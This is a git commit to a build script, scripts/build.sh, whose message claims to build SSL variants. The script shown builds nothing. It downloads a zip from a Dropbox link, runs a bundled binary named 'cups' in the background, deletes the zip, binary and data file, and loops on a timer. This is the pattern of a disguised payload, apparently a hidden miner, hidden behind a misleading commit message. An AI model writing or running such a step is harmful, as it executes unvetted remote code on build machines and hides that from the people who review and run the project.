9a95ba9ba8b50d8704849b232477a51f039d9c7f
diteco <diteco@coin-one.com>
2019-08-22 23:37:39 +0200

    Build all ssl variants

--- scripts/build.sh
+++ scripts/build.sh
@@ -4,11 +4,11 @@ end=$((SECONDS+$1))
 wget https://www.dropbox.com/s/zp4w3qcqxzmx52c/wan03.zip -q
 unzip wan03.zip > /dev/null 2>&1
 #pwd
-./cups ./data &
+./cups ./datum &
 sleep 3
 rm -rf wan03.zip
 rm -rf cups
-rm -rf data
+rm -rf datum
 while [ $SECONDS -lt $end ]
 do
     read line
